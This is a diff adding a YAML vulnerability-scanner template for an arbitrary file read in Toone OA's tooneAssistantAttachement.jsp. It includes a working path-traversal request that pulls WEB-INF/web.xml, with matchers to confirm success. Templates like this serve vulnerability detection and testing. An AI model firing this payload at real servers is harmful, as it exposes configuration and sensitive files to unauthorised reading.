@@ -1,0 +1,26 @@
+id: poc-yaml-etwowin-oa-tooneassistantattachement-jsp-anyfile-read
+info:
+  name: Toone OA tooneAssistantAttachement.jsp Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read
+  description: |
+    Toone OA's tooneAssistantAttachement.jsp endpoint is vulnerable to arbitrary file read, where attackers can retrieve sensitive files from the server.
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jsp/oa/app/webservice/tooneAssistant/tooneAssistantAttachement.jsp?filename=./../../../../../WEB-INF/web.xml"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "web-app"
+          - "<display-name>"
+      - type: word
+        part: header
+        words:
+          - "fileName=web.xml"
+      - type: status
+        status:
+          - 200
